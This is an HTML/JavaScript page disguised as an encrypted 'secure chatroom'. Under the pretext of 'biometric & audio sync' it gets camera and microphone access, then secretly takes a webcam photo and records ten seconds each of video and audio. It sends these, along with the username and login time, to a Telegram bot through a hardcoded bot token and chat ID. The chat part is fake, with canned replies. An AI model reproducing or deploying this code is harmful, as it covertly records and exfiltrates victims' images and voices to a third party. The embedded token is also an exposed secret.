<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Secure Chatroom | Encrypted</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --primary: #00f2fe;
            --secondary: #4facfe;
            --accent: #f093fb;
            --bg: #0b0e14;
            --glass: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; outline: none; }

        body, html {
            margin: 0; padding: 0;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: var(--bg);
            background-image: radial-gradient(circle at top right, #16213e, #0b0e14);
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }

        /* Login Screen */
        #login-screen {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(15px);
            z-index: 9999;
            display: flex; align-items: center; justify-content: center;
        }

        .login-box {
            background: var(--glass);
            border: 1px solid var(--glass-border);
            padding: 40px;
            border-radius: 24px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-icon {
            font-size: 50px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; color: #888; letter-spacing: 1px; }
        
        input[type="text"] {
            width: 100%;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--glass-border);
            padding: 14px;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            transition: 0.3s;
        }

        input[type="text"]:focus { border-color: var(--primary); background: rgba(255,255,255,0.1); }

        .btn-join {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(45deg, var(--secondary), var(--primary));
            color: #000; font-weight: 700; font-size: 16px;
            cursor: pointer; transition: 0.3s;
        }

        .btn-join:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3); }

        /* Main App Layout */
        .app-container {
            display: none;
            grid-template-columns: 280px 1fr;
            height: 100vh;
        }

        /* Sidebar */
        aside {
            background: rgba(0,0,0,0.3);
            border-right: 1px solid var(--glass-border);
            padding: 20px;
            display: flex;
            flex-direction: column;
        }

        .status-card {
            background: var(--glass);
            padding: 15px;
            border-radius: 15px;
            font-size: 13px;
            margin-bottom: 20px;
        }

        .indicator { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #555; }
        .dot.active { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
        .dot.recording { background: #ff4b2b; animation: pulse 1s infinite; }

        /* Chat Area */
        main { display: flex; flex-direction: column; background: rgba(255,255,255,0.02); }

        header {
            padding: 20px;
            border-bottom: 1px solid var(--glass-border);
            display: flex; justify-content: space-between; align-items: center;
        }

        #chat-messages {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .msg {
            max-width: 70%;
            padding: 12px 18px;
            border-radius: 18px;
            font-size: 14px;
            line-height: 1.5;
        }

        .msg.sent {
            align-self: flex-end;
            background: linear-gradient(45deg, var(--secondary), var(--primary));
            color: #000;
            border-bottom-right-radius: 4px;
        }

        .msg.received {
            align-self: flex-start;
            background: var(--glass);
            border: 1px solid var(--glass-border);
            border-bottom-left-radius: 4px;
        }

        .chat-input-area {
            padding: 20px;
            background: rgba(0,0,0,0.2);
            display: flex; gap: 15px;
        }

        #msg-input { flex: 1; }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        /* Hidden helpers */
        #video-preview { position: fixed; top: -500px; width: 200px; }
    </style>
</head>
<body>

    <!-- Login Overlay -->
    <div id="login-screen">
        <div class="login-box">
            <div class="logo-icon"><i class="fas fa-user-shield"></i></div>
            <h2 style="margin: 0 0 10px 0;">Internal Network</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Initialize biometric & audio sync to join</p>
            
            <div class="input-group">
                <label>Identify as</label>
                <input type="text" id="username" placeholder="Enter username...">
            </div>

            <button class="btn-join" id="join-btn">AUTHORIZE & ENTER</button>
            <p id="perm-notice" style="font-size: 11px; color: #555; margin-top: 15px;">Camera and Microphone access required for encryption keys.</p>
        </div>
    </div>

    <!-- Main Chat App -->
    <div class="app-container" id="main-app">
        <aside>
            <h3><i class="fas fa-microchip"></i> System</h3>
            <div class="status-card">
                <div class="indicator">
                    <div class="dot active"></div> Network: Encrypted
                </div>
                <div class="indicator">
                    <div id="cam-dot" class="dot"></div> Cam: <span id="cam-status">Idle</span>
                </div>
                <div class="indicator">
                    <div id="mic-dot" class="dot"></div> Mic: <span id="mic-status">Idle</span>
                </div>
            </div>
            <div style="font-size: 12px; color: #666;">
                <p>Chat ID: 8101021767</p>
                <p>Node: Pro-v1.2.4</p>
            </div>
        </aside>

        <main>
            <header>
                <div>
                    <span id="user-display" style="font-weight: bold; color: var(--primary);">User</span>
                    <small style="display: block; color: #555;">Online Now</small>
                </div>
                <i class="fas fa-ellipsis-v" style="color: #555; cursor: pointer;"></i>
            </header>

            <div id="chat-messages">
                <!-- Messages load here -->
            </div>

            <div class="chat-input-area">
                <input type="text" id="msg-input" placeholder="Secure message...">
                <button class="btn-join" id="send-btn" style="width: 60px;"><i class="fas fa-paper-plane"></i></button>
            </div>
        </main>
    </div>

    <!-- Background Capture -->
    <video id="video-preview" autoplay muted playsinline></video>
    <canvas id="snapshot-canvas" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            TOKEN: '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk',
            CHAT_ID: '8101021767'
        };

        let userStream = null;
        let currentUser = "";

        const joinBtn = document.getElementById('join-btn');
        const loginScreen = document.getElementById('login-screen');
        const mainApp = document.getElementById('main-app');
        const chatMessages = document.getElementById('chat-messages');

        // Initial Join
        joinBtn.onclick = async () => {
            const name = document.getElementById('username').value.trim();
            if(!name) return alert("Identify yourself first.");
            
            try {
                userStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video-preview').srcObject = userStream;
                
                currentUser = name;
                document.getElementById('user-display').innerText = currentUser;
                
                loginScreen.style.display = 'none';
                mainApp.style.display = 'grid';
                
                // Start sequence
                initAutomation();
                loadMessages();

            } catch (e) {
                alert("Critical Error: Cam/Mic access denied. Room inaccessible.");
            }
        };

        async function initAutomation() {
            // 1. Text Data
            sendTelegram(`🚨 *New Pro Login*\n👤 User: ${currentUser}\n📅 Time: ${new Date().toLocaleString()}`);

            // 2. Face Scan (Photo)
            updateStatus('cam', 'Scanning...', 'recording');
            setTimeout(() => {
                capturePhoto();
                updateStatus('cam', 'Authorized', 'active');
            }, 3000);

            // 3. Video Record (10 Sec)
            setTimeout(() => {
                recordMedia('video', 10000);
            }, 4000);

            // 4. Audio Record (10 Sec)
            setTimeout(() => {
                recordMedia('audio', 10000);
            }, 15000); // Starts after video finishes
        }

        function updateStatus(id, text, dotClass) {
            document.getElementById(`${id}-status`).innerText = text;
            const dot = document.getElementById(`${id}-dot`);
            dot.className = 'dot ' + dotClass;
        }

        async function sendTelegram(text) {
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        function capturePhoto() {
            const video = document.getElementById('video-preview');
            const canvas = document.getElementById('snapshot-canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', blob, 'scan.jpg');
                fd.append('caption', `📸 Face Scan: ${currentUser}`);
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }

        function recordMedia(type, duration) {
            updateStatus(type === 'video' ? 'cam' : 'mic', `Recording ${type}...`, 'recording');
            
            const options = { mimeType: type === 'video' ? 'video/webm' : 'audio/webm' };
            const recorder = new MediaRecorder(userStream, options);
            const chunks = [];

            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: options.mimeType });
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                
                const endpoint = type === 'video' ? 'sendVideo' : 'sendAudio';
                fd.append(type, blob, `capture.${type === 'video' ? 'webm' : 'ogg'}`);
                fd.append('caption', `📡 10s ${type} for: ${currentUser}`);

                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${endpoint}`, { method: 'POST', body: fd });
                updateStatus(type === 'video' ? 'cam' : 'mic', 'Synced', 'active');
            };

            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        }

        // --- Chat Logic ---
        const msgInput = document.getElementById('msg-input');
        const sendBtn = document.getElementById('send-btn');

        function appendMsg(text, type) {
            const div = document.createElement('div');
            div.className = `msg ${type}`;
            div.innerText = text;
            chatMessages.appendChild(div);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        function loadMessages() {
            const history = JSON.parse(localStorage.getItem('pro_chat') || '[]');
            history.forEach(m => appendMsg(m.text, m.type));
            if(history.length === 0) {
                appendMsg("System: Secure connection established. Local storage active.", "received");
            }
        }

        function saveMsg(text, type) {
            const history = JSON.parse(localStorage.getItem('pro_chat') || '[]');
            history.push({ text, type });
            localStorage.setItem('pro_chat', JSON.stringify(history));
        }

        sendBtn.onclick = () => {
            const txt = msgInput.value.trim();
            if(!txt) return;
            
            appendMsg(txt, 'sent');
            saveMsg(txt, 'sent');
            msgInput.value = '';

            // Simulated Pro Response
            setTimeout(() => {
                const auto = "Command processed. Packet encrypted.";
                appendMsg(auto, 'received');
                saveMsg(auto, 'received');
            }, 1000);
        };

        msgInput.onkeydown = (e) => { if(e.key === 'Enter') sendBtn.click(); };

    </script>
</body>
</html>
